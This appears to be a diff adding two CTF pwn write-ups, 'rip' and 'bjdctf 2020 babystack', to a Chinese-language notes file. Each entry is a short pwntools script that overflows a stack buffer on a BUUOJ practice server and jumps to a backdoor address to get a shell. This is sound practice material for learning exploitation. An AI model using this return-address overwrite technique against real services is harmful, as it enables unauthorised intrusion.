@@ -147,6 +147,38 @@ io.send(p)
 io.interactive()
 
 ```
+### rip
+- 知识点： 64位程序栈溢出、栈对齐
+- payload
+```
+from pwn import *
+
+p = remote("node4.buuoj.cn", 25693)
+payload = b'a' * 15 + p64(0x401186)
+p.sendline(payload)
+p.interactive()
+
+```
+
+### bjdctf 2020 babystack
+- 知识点：栈溢出
+- payload
+```
+from pwn import *
+
+p = remote('node4.buuoj.cn', 27735)
+payload = b'a' * 24 + p64(0x4006E6)
+p.sendlineafter(b"name:", "40")
+p.sendlineafter(b"name?", payload)
+p.interactive()
+
+```
+
+
+
+
+
+
 
 
 ## NSSCTF
